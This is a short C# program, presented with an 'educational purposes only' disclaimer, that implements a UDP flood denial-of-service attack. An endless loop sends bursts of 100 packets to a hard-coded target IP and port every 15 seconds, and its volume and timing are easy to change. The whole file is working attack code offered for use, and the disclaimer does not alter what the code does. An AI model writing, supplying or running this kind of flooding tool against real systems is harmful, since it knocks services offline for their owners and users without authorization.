using System.Net.Sockets;
using System.Text;

/*
 * This script demonstrates an example of a UDP Flood attack, which is a form of Denial of Service (DoS) attack. 
 * The script sends a large number of UDP packets to the target in an attempt to overwhelm its resources. 
 *
 * IMPORTANT NOTICE:
 * This script is provided for educational purposes only. The author of this script takes no responsibility 
 * for any misuse or illegal activity associated with this code. 
 *
 * Unauthorized use of this script on any network, server, or system that you do not own, or do not have explicit 
 * permission to test, is illegal and may lead to severe consequences, including legal actions.
 *
 * It is the responsibility of the user to ensure that this script is only used in environments where testing 
 * has been authorized by the appropriate stakeholders or administrators.
 *
 * Always respect the law and ethical guidelines when using or testing any software.
 */

class Program
{
    static void Main(string[] args)
    {
        string targetIp = "192.168.0.1"; // Target IP address for the UDP packets
        int targetPort = 80;             // Target port number for the UDP packets

        UdpClient client = new UdpClient();

        while (true)
        {
            byte[] data = Encoding.UTF8.GetBytes("Hello"); // Packet contents

            for (int i = 0; i < 100; i++) // Number of packets sent at one time
            {
                client.Send(data, data.Length, targetIp, targetPort);

                Console.WriteLine($"Data sent on {targetIp}:{targetPort}");
            }

            Thread.Sleep(15000); // Delay before sending again in milliseconds (default - 15000)
        }
    }
}
